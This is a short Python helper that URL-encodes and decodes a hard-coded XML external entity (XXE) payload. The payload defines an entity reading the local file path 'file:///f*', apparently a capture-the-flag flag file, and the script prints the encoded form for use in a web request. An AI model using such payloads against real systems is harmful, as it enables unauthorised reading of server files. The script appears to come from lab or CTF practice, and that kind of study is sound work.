from urllib.parse import quote, unquote
def url_encode(text):
    encoded_text = quote(text)
    return encoded_text
def url_decode(encoded_text):
    decoded_text = unquote(encoded_text)
    return decoded_text

original_text = '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///f*"> ]> <xml><name>&xxe;</name></xml>'
print("Original text:", original_text)

encoded_text = url_encode(original_text)
print("Encoded text:", encoded_text)

decoded_text = url_decode(encoded_text)
print("Decoded text:", decoded_text)
